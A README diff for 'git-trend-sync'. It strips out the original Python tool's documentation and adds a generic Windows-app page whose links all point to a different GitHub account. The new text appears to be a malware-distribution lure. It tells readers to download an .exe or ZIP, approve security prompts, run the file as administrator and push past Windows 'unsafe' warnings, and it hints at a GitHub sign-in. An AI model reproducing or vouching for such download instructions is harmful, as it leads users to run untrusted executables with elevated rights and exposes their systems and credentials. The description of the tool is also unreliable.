@@ -1,456 +1,237 @@
-<div align="center">
+# 🤖 git-trend-sync - Find trends that fit your code
 
-# 🔄 git-trend-sync
+[![Download](https://img.shields.io/badge/Download%20Now-4F46E5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/juninfxp/git-trend-sync)
 
-### Sync AI trends to your project
+## 🚀 What this app does
 
-[![GitHub Stars](https://img.shields.io/github/stars/JSLEEKR/git-trend-sync?style=for-the-badge&logo=github&color=yellow)](https://github.com/JSLEEKR/git-trend-sync/stargazers)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Claude](https://img.shields.io/badge/powered%20by-Claude%20Code-D4A574?style=for-the-badge)](https://claude.ai)
+git-trend-sync helps you find trending GitHub repos and match them to your project. It checks what is popular, then looks for a fit with the code you already use.
 
-<br/>
+Use it when you want to:
+- see new tools that may help your project
+- find open source repos that match your stack
+- save time on manual research
+- keep up with AI tools and GitHub trends
 
-**Detects what's actually trending — not just popular — in the AI agent ecosystem**
+It is built for Windows users who want a simple way to explore useful repos without digging through GitHub by hand.
 
-Activity-based scoring + Project-specific recommendations + Claude Code slash commands
+## 💻 What you need
 
-[📊 Latest Report](reports/) · [🔧 Setup Guide](#-quick-start)
+Before you start, make sure you have:
+- a Windows PC
+- an internet connection
+- enough free disk space for the app and its data
+- permission to run apps on your computer
 
-</div>
+Recommended setup:
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- a modern browser for opening the download page
 
----
+## 📥 Download the app
 
-## Why This Exists
+Go to the main project page here:
 
-The AI ecosystem moves fast. New frameworks, tools, and patterns emerge weekly. Yesterday's best practice is today's legacy code.
+https://github.com/juninfxp/git-trend-sync
 
-**git-trend-sync** keeps your project in sync with what matters. It scans 12 categories of AI repositories, ranks them by real development activity, and tells you — specifically for YOUR codebase — what's worth adopting and what's noise.
+From there, visit this page to download the latest release or get the app files.
 
-Think of it as a daily briefing: "Here's what's actively being built in the AI world, and here's what actually applies to your project."
+## 🛠️ Install on Windows
 
-- **12 categories tracked** — from AI agents to MCP servers, browser automation to voice AI
-- **Activity-ranked** — sorted by 30-day commits, not just stars
-- **Project-aware** — scans your code and only recommends what fits your stack
-- **Design docs on demand** — `/trend-apply` generates integration plans, not just links
+Follow these steps on your Windows PC:
 
-Stop manually browsing GitHub. Let the trends sync to you.
+1. Open the download link in your browser.
+2. Look for the latest release or the main project files.
+3. Download the Windows version of the app.
+4. If the file ends in `.exe`, save it to your Downloads folder or Desktop.
+5. If Windows asks for permission, choose Yes.
+6. If a security prompt appears, choose Run or Open.
+7. Wait for the app to start.
 
-<!-- TREND-START -->
-### Today's Top Trending (2026-04-14)
+If the app comes in a ZIP file:
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Find the app file inside.
+5. Double-click it to run.
 
-| # | Repository | Category | Score | Signal | Detail |
-|---|-----------|----------|-------|--------|--------|
-| 1 | [graphify](https://github.com/safishamsi/graphify) | Knowledge Management | 9.3 | 🆕 newcomer | 10d, 2588.2/day |
-| 2 | [rtk](https://github.com/rtk-ai/rtk) | Coding Assistant | 8.9 | 📈 momentum | 81 commits/7d |
-| 3 | [oh-my-pi](https://github.com/can1357/oh-my-pi) | Coding Assistant | 8.7 | 📈 momentum | 164 commits/7d |
-| 4 | [edgequake](https://github.com/raphaelmansuy/edgequake) | Knowledge Management | 8.7 | 🔥 surge | x1.0 this week |
-| 5 | [Vibe-Skills](https://github.com/foryourhealth111-pixel/Vibe-Skills) | AI Workflow | 8.6 | 📈 momentum | 147 commits/7d |
-| 6 | [code-review-graph](https://github.com/tirth8205/code-review-graph) | Knowledge Management | 8.6 | 📈 momentum | 43 commits/7d |
-| 7 | [codebase-memory-mcp](https://github.com/DeusData/codebase-memory-mcp) | Knowledge Management | 8.4 | 🔥 surge | x1.0 this week |
-| 8 | [antigravity-awesome-skills](https://github.com/sickn33/antigravity-awesome-skills) | Coding Assistant | 8.3 | 🆕 newcomer | 89d, 369.8/day |
-| 9 | [RuVector](https://github.com/ruvnet/RuVector) | AI Infrastructure | 8.2 | 🆕 newcomer | 146d, 25.9/day |
-| 10 | [mempalace](https://github.com/MemPalace/mempalace) | MCP | 8.2 | 🆕 newcomer | 9d, 5043.0/day |
+## ▶️ First time setup
 
-> Last updated: 2026-04-14 — [Full Report](reports/2026-04-14.md)
-<!-- TREND-END -->
+When you open git-trend-sync for the first time, it may ask for a few basic details.
 
----
+You may see options for:
+- your project folder
+- the type of code you use
+- how often to check for new trends
+- which topics you care about
 
-## 📋 What is this?
+Use simple choices at first. You can change them later.
 
-An automated system that tracks **development activity** across 12 AI agent categories and recommends trending tools that are relevant to **your** project.
+Good starter settings:
+- project folder: the main folder for your app
+- scan mode: full project scan
+- update check: once a day
+- trend topics: AI, automation, developer tools, open source
 
-### Why activity, not just stars?
+## 🔎 How it works
 
-| Metric | What it finds | Problem |
-|--------|--------------|---------|
-| ⭐ Total stars | Established projects | Misses actively developed new tools |
-| 🔥 **30-day commits** | Tools being actively built *right now* | Catches real momentum |
+The app follows a simple flow:
 
-### Three Pipelines
+1. It looks at GitHub trend data.
+2. It finds repos that are getting attention.
+3. It checks topics and project signals.
+4. It compares those results with your codebase.
+5. It shows the repos that look like a match.
 
-| Pipeline | When | What |
-|----------|------|------|
-| 🔍 **Trend Collection** | Daily (automated) | Collects repos, computes activity scores, generates report |
-| 🎯 **Recommendations** | After collection | Scans your project, matches with trends, suggests what's relevant |
-| 🔬 **Deep Analysis** | On-demand | Detailed integration design doc for a specific trending repo |
+This helps you focus on tools that may fit your work instead of sorting through random links.
 
-### Categories
+## 🧭 Using the app
 
-| Category | Description |
-|:---------|:------------|
-| 🧠 **AI Agent Framework** | General-purpose agent frameworks |
-| 🔍 **RAG Framework** | Retrieval-augmented generation |
-| 🤝 **Multi-Agent** | Multi-agent orchestration |
-| 💻 **Coding Assistant** | AI coding tools |
-| ⚙️ **AI Infrastructure** | LLM serving, gateways, inference |
-| 🌐 **Browser Agent** | Web browser automation agents |
-| 🔌 **MCP** | Model Context Protocol ecosystem |
-| 🔄 **AI Workflow** | Visual AI workflow builders |
-| 🎙️ **Voice Agent** | Voice/realtime AI agents |
-| 🧩 **Knowledge Management** | Knowledge graphs, vector DBs, memory |
-| 📊 **AI Observability** | LLM monitoring, evaluation, prompts |
-| 🖥️ **Computer Use Agent** | Desktop/OS automation agents |
+After setup, use these main steps:
 
----
+1. Open git-trend-sync.
+2. Choose your project folder.
+3. Pick the topics you want to track.
+4. Start the scan.
+5. Review the matched repos.
+6. Save the ones you want to follow.
 
-## 🚀 Quick Start
+You can use it for:
+- AI project research
+- tool watchlists
+- weekly repo review
+- new library discovery
+- open source tracking
+
+## ⚙️ Common settings
+
+Here are some simple settings you may see in the app:
+
+### 📁 Project folder
+This is the folder that contains your work files. Pick the root folder, not a single file.
+
+### 🏷️ Topics to track
+These are search tags that help the app find better matches. Good examples include:
+- ai
+- mcp
+- rag
+- developer-tools
+- automation
+- claude-code
+- open-source
+
+### ⏱️ Check frequency
+This controls how often the app looks for new trends. A daily check works well for most users.
+
+### 🔐 Sign-in
+Some setups may ask for a GitHub sign-in. This can help the app read more data and keep your results current.
+
+## 📊 What you will see
 
-### Prerequisites
+The app may show:
+- repo name
+- short description
+- topic match
+- trend score
+- project fit score
+- links to the GitHub repo
+- save or ignore options
 
-- Python 3.10+
-- GitHub Personal Access Token
+These fields help you decide fast which repos are worth a closer look.
 
-### Setup
+## 🧠 Best ways to use it
 
-```bash
-git clone https://github.com/JSLEEKR/git-trend-sync.git
-cd git-trend-sync
-pip install -r requirements.txt
-echo "GITHUB_TOKEN=ghp_your_token_here" > .env
-```
+To get better results:
+- use the folder for the real project you work on
+- pick topics that match your stack
+- keep your topic list short at first
+- review results once a day or once a week
+- remove topics that do not help
 
-### Run
+If your project uses AI tools, the app may work well with:
+- agent workflows
+- code search tools
+- retrieval systems
+- model-based helpers
+- automation scripts
 
-```bash
-# Full pipeline (collect → trending → analysis → report → recommendations)
-python run.py
+## 🧰 Troubleshooting
 
-# Skip analysis
-python run.py --skip-analysis
+### The app does not open
+Try these steps:
+1. Close the app.
+2. Right-click the file.
+3. Choose Run as administrator.
+4. Check that Windows did not block the file.
 
-# Recommendations for a specific project
-python run.py --project /path/to/my/project
+### The download did not finish
+Try again with a stable internet connection. If the page has several files, make sure you pick the Windows version.
 
-# Skip recommendations
-python run.py --no-recommend
+### The app opens, but shows no results
+Check that:
+- you selected the right project folder
+- you have an internet connection
+- your topic list has useful terms
+- the scan finished fully
 
-# Regenerate report from existing data
-python run.py --report-only
+### Windows says the file is unsafe
+This can happen with new apps or ZIP files. Make sure you downloaded it from the main GitHub page:
 
-# Deep analysis for a specific repo
-python src/apply.py --repo ragflow --project /path/to/my/project
-```
+https://github.com/juninfxp/git-trend-sync
 
----
+## 🗂️ File layout
 
-## ⚡ Claude Code Slash Commands
+You may see files like these after download:
+- the main app file
+- a README file
+- config files
+- logs
+- cached trend data
 
-Install slash commands by placing this repo's `.claude/commands/` in your project:
+Keep the files in one folder. Do not move parts of the app around unless you know what they do.
 
-### `/trend` — View today's trends
+## 🔄 Updates
 
-Shows a summary of trending repos: new entries, rising repos, top performers.
+To get newer versions:
+1. Visit the GitHub page.
+2. Check the latest release.
+3. Download the newest Windows file.
+4. Replace the old version if needed.
+5. Open the app again.
 
-### `/trend-apply` — Smart project recommendations
-
-Scans your current project's code, matches against today's trending data, and:
-- If relevant trends found → generates a **design document** with integration plan
-- If nothing relevant → tells you "nothing today" with explanation
-
-Design docs are saved to `docs/trend-apply/YYYY-MM-DD-<repo>.md` with:
-- Why the trending repo matters to your project
-- Which files would be affected
-- Migration path with code examples
-- Risks, effort estimate, and verdict (adopt/wait/skip)
-
----
-
-## 📊 How Trending Works
-
-Repos are ranked by **development activity** — the number of commits in the last 30 days. This surfaces tools that are actively being built and improved, not just popular repos that stopped evolving.
-
-### Filters
-- **Stars > 1,000** — eliminates noise from toy projects
-- **Pushed within 7 days** — must be recently active
-- **30-day commit count** — primary ranking signal
+If you keep your settings in a separate config file, you may be able to keep them when you update.
 
-### Report Format
+## 🧩 Topic ideas
 
-| # | Repository | Activity | Stars | Commits (30d) | Last Push | Age | Status |
-|---|-----------|----------|-------|---------------|-----------|-----|--------|
-| 1 | some-repo | 🔥 9.2 | 5,230 | 347 | 1d ago | 85d | NEW ENTRY |
-| 2 | other-repo | 📈 6.8 | 45,000 | 189 | 3d ago | 2y | ACTIVE |
-
----
+If you do not know what to track, start with:
+- ai
+- ai-agent
+- mcp
+- rag
+- github-trends
+- automation
+- developer-tools
+- open-source
 
-## 🎯 Project Recommendations
+You can add more topics later based on your project.
 
-Add `git-trend-sync.yaml` to your project root for targeted recommendations:
+## 🖱️ Simple use case
 
-```yaml
-project:
-  name: "My AI App"
-  description: "A conversational AI assistant with RAG pipeline"
-  tech_stack: ["python", "fastapi", "langchain"]
-  interests: ["better RAG", "agent orchestration", "code generation"]
-  exclude: ["java", "go"]
-```
+If you build a small app and want useful tools around it, git-trend-sync can help you:
+- find new repos in your area
+- compare them with your current stack
+- watch for new AI tools
+- keep a clean list of useful projects
 
-Without config, the scanner auto-detects your stack from `requirements.txt`, `package.json`, etc.
+This saves time and helps you stay current without manual searching
 
----
-
-## 📁 Project Structure
+## 📌 Project details
 
-```
-git-trend-sync/
-├── src/
-│   ├── collect.py        # GitHub data collection (stars>1000, 7d active)
-│   ├── trending.py       # Activity-based trend scoring
-│   ├── metrics.py        # Legacy quantitative metrics
-│   ├── analyze.py        # Qualitative analysis engine
-│   ├── analyze.sh        # Shell-based analysis runner
-│   ├── report.py         # Trend report generation
-│   ├── scan_project.py   # Project context scanner
-│   ├── recommend.py      # Project-trend matcher
-│   ├── apply.py          # Deep integration analysis
-│   ├── history.py        # Trend history tracking
-│   ├── badge.py          # Shields.io badge generation
-│   ├── readme_update.py  # README trend table updater
-│   ├── star_history.py   # Star growth visualization
-│   └── publish.sh        # Git commit & push
-├── config/
-│   ├── categories.yaml   # Category & topic config
-│   └── prompts/          # Analysis prompt templates
-├── data/
-│   └── YYYY-MM-DD/       # Daily analysis data
-├── reports/              # Generated reports
-├── .claude/commands/     # /trend and /trend-apply
-├── run.py                # Main orchestrator
-└── git-trend-sync.yaml.example
-```
+- Repository: git-trend-sync
+- Description: Sync AI trends to your project — auto-discovers trending GitHub repos and matches them to your codebase
+- Topics: active-project, ai, ai-agent, ai-tools, automation, claude-code, developer-tools, github-trends, mcp, multi-agent, open-source, rag, trending
 
----
+## 📎 Quick access
 
-## Architecture
+Main page and download source:
 
-### Data Flow
-
-```
-GitHub Topics API
-      |
-      v
-  collect.py ──────> data/{date}/raw.json
-      |
-      v
-  trending.py ─────> data/{date}/trending.json
-      |
-      v
-  metrics.py ──────> data/{date}/metrics.json
-      |
-      v
-  analyze.py ──────> data/{date}/analysis/{category}.json
-      |
-      v
-  report.py ───────> reports/{date}.md
-      |
-      v
-  recommend.py ────> reports/{date}-recommendations.md
-      |
-      v
-  apply.py ────────> reports/apply-{repo}-{date}.md
-```
-
-### Scoring Algorithm
-
-Each repository receives an **activity score** (0-10) based on 30-day commit count, normalized within its category:
-
-```
-score = (repo_commits - category_min) / (category_max - category_min) * 10
-```
-
-Repos with identical commit counts are ranked by star count as tiebreaker.
-
-### Recommendation Matching
-
-When scanning your project, git-trend-sync builds a compatibility profile:
-
-| Signal | Points | How Detected |
-|--------|--------|-------------|
-| Stack match | +2 | Your language/ecosystem matches repo's primary language |
-| Interest match | +2 | Keywords from your config or dependencies overlap with repo topics |
-| Dependency overlap | +1 | Repo name appears in your current dependencies |
-| New entry | +1 | Repository is less than 6 months old |
-
-Repos scoring 4+ are **High Relevance**, 2+ are **Worth Watching**.
-
----
-
-## Supported Stack Detection
-
-git-trend-sync auto-detects your project's tech stack by scanning dependency manifests:
-
-| Language | Manifest Files |
-|----------|---------------|
-| Python | `requirements.txt`, `pyproject.toml`, `setup.py` |
-| JavaScript/TypeScript | `package.json` |
-| Go | `go.mod` |
-| Rust | `Cargo.toml` |
-| Java | `pom.xml`, `build.gradle` |
-| Ruby | `Gemfile` |
-| PHP | `composer.json` |
-| Elixir | `mix.exs` |
-
-Framework detection maps 50+ known packages to labels (e.g., `langchain` -> LLM Framework, `fastapi` -> Web Framework).
-
----
-
-## Reports Generated
-
-Each daily run produces multiple reports:
-
-| Report | File | Content |
-|--------|------|---------|
-| Main trend report | `reports/{date}.md` | Per-category trending tables with analysis |
-| Activity history | `reports/{date}-history.md` | Sparkline charts showing repo momentum |
-| Star growth | `reports/{date}-star-history.md` | 30-day star growth visualization |
-| Badges | `reports/{date}-badges.md` | Copy-paste shields.io badges for trending repos |
-| Recommendations | `reports/{date}-recommendations.md` | Project-specific tool suggestions |
-| Deep analysis | `reports/apply-{repo}-{date}.md` | Integration design doc for a specific repo |
-
-### Example Activity Sparkline
-
-```
-langchain  ▅▆▇▇█▇▆▅▅▆▆▇▇█████▇▆▆▇▇█▇▆▅▅▆▇█  9.2
-browser-use ▁▂▃▃▅▇▇██████▇▇▆▅▅▆▇▇████████▇▇█  8.7
-vllm        ▃▃▅▆▇▇█▇▆▅▄▃▃▅▆▇▇█▇▆▅▅▆▇▇█▇▆▅▅▆  7.4
-```
-
----
-
-## ⚙️ Automation
-
-### GitHub Actions (Recommended)
-
-The included workflow (`.github/workflows/daily-trend.yml`) runs daily at 09:00 UTC:
-
-1. Collects trending data from GitHub API
-2. Generates reports and updates README
-3. Commits results and pushes automatically
-4. Posts a notification comment on a pinned GitHub issue
-
-To enable:
-1. Go to **Settings > Secrets and variables > Actions**
-2. Add `GH_PAT` with a GitHub Personal Access Token (read:repo scope)
-3. The workflow triggers daily or via **Actions > Daily Trend Sync > Run workflow**
-
-### Windows Task Scheduler
-
-1. Open Task Scheduler
-2. Create Basic Task -> Name: `git-trend-sync`
-3. Trigger: Daily at your preferred time
-4. Action: Start a program
-   - Program: `python`
-   - Arguments: `C:\path\to\git-trend-sync\run.py`
-5. Done
-
-### cron (Linux/macOS)
-
-```bash
-# Run daily at 6 PM
-0 18 * * * cd /path/to/git-trend-sync && python run.py --skip-analysis >> /var/log/git-trend-sync.log 2>&1
-```
-
----
-
-## API Reference
-
-### Core Functions
-
-```python
-from src.collect import collect_all
-from src.trending import run_trending
-from src.metrics import run_metrics
-from src.report import generate_reports
-from src.recommend import run_recommendations
-from src.scan_project import scan_project, recommend_categories
-
-# Collect trending data
-data = collect_all()                              # -> data/{date}/raw.json
-
-# Compute activity scores
-trending = run_trending("2026-03-28")             # -> data/{date}/trending.json
-
-# Compute quantitative metrics
-metrics = run_metrics("2026-03-28")               # -> data/{date}/metrics.json
-
-# Generate markdown report
-report_path = generate_reports("2026-03-28")      # -> reports/{date}.md
-
-# Scan a project's tech stack
-profile = scan_project("/path/to/project")        # -> dict with stack, deps, frameworks
-
-# Get recommendations
-rec_path = run_recommendations("2026-03-28", "/path/to/project")
-```
-
-### Configuration
-
-Create `git-trend-sync.yaml` in your project root:
-
-```yaml
-project:
-  name: "My AI App"
-  description: "A conversational AI assistant with RAG pipeline"
-  tech_stack: ["python", "fastapi", "langchain"]
-  interests:
-    - "better RAG performance"
-    - "agent orchestration"
-    - "code generation"
-    - "MCP integration"
-  exclude: ["java", "go"]  # Exclude entire ecosystems
-```
-
-### Environment Variables
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `GITHUB_TOKEN` | Yes | GitHub Personal Access Token for API access |
-| `CLAUDE_API_KEY` | No | Required only for analysis mode (enabled by default, skip with `--skip-analysis`) |
-
----
-
-## Testing
-
-```bash
-# Install test dependencies
-pip install -r requirements.txt pytest
-
-# Run all tests
-python -m pytest tests/ -v
-
-# Run specific module tests
-python -m pytest tests/test_trending.py -v
-
-# Run with coverage
-python -m pytest tests/ --cov=src --cov-report=term-missing
-```
-
----
-
-## Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feat/amazing-feature`)
-3. Run tests (`python -m pytest tests/ -v`)
-4. Commit your changes (`git commit -m "feat: add amazing feature"`)
-5. Push to the branch (`git push origin feat/amazing-feature`)
-6. Open a Pull Request
-
----
-
-## License
-
-MIT -- see [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-
-### Built with Claude Code
-
-[Report Bug](https://github.com/JSLEEKR/git-trend-sync/issues) . [Request Feature](https://github.com/JSLEEKR/git-trend-sync/issues)
-
-</div>
+https://github.com/juninfxp/git-trend-sync
